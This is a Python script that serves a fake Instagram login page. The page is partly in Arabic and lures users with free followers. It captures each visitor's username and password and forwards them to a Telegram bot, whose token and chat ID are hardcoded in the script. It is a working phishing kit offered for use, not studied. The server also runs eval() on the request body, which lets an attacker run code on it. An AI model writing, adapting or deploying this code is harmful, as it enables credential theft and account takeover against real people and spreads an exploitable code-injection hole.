import http.server
import socketserver
import requests

PORT = 8000

# Telegram Bot details
TELEGRAM_BOT_TOKEN = '7299752144:AAFByobB2HKw0XsrPWVVi7PGTD1REBFvzKU'
TELEGRAM_CHAT_ID = '1217505345'

# Define the HTML content for the login page
login_page_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #f4c2c2, #f9e2e2, #fbe8a6, #f9e1e1);
            background-size: 400% 400%;
            animation: gradient 10s ease infinite;
        }
        @keyframes gradient {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }
        .container {
            width: 350px;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
        }
        .container img {
            width: 50px;
            margin-bottom: 20px;
        }
        .container h1 {
            font-size: 24px;
            color: #ff69b4;
            margin-bottom: 10px;
        }
        .container h2 {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }
        .container input {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .container button {
            width: calc(100% - 22px);
            padding: 10px;
            background-color: #ff69b4;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #ff1493;
        }
        .container p {
            font-size: 14px;
            color: #333;
            margin-top: 10px;
        }
        .message {
            display: none;
            text-align: center;
            padding: 20px;
            border-radius: 8px;
            background-color: #e0f7fa;
            color: #00796b;
            font-size: 18px;
        }
        .message.show {
            display: block;
        }
        .message .checkmark {
            font-size: 50px;
            color: #4caf50;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <h1 style="color: #ff69b4;">Instagram Login</h1>
        <h2>رشق 1k متابع مجانا لمرة واحدة</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">شراء</button>
        </form>
    </div>
    <div id="message" class="message">
        <div class="checkmark">✔</div>
        <p>تم الشراء بنجاح، انتظر بضع دقائق.</p>
    </div>
    <script>
        let clickCount = 0;
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            clickCount++;
            if (clickCount >= 3) {
                document.querySelector('.container').style.display = 'none';
                document.getElementById('message').classList.add('show');
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username: username, password: password })
                });
            }
        });
    </script>
</body>
</html>
'''

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(login_page_html.encode('utf-8'))
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = eval(post_data)  # Consider using a safer parser in production
            
            # Send data to Telegram bot
            message = f"Username: {data['username']}\nPassword: {data['password']}"
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage', data={
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message
            })
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

def run(server_class=http.server.HTTPServer, handler_class=RequestHandler):
    server_address = ('0.0.0.0', PORT)
    httpd = server_class(server_address, handler_class)
    print(f"Serving on port {PORT}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()